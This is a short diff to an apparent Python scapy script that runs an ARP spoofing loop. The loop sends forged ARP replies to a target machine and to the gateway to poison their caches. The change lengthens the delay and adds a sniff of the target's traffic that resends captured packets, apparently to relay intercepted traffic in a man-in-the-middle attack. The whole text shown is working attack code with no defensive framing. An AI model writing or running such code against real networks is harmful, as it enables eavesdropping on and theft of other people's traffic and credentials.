@@ -31,4 +31,6 @@ while True:
                          pdst=target_ip, hwdst=target_mac), verbose=0)
     scapy.send(scapy.ARP(op='is-at', psrc=target_ip,
                          pdst=gateway, hwdst=gateway_mac), verbose=0)
-    sleep(1)
+    sleep(1.5)
+    scapy.sniff(filter=f"host {target_ip}",
+                prn=lambda x: scapy.send(x), count=1)
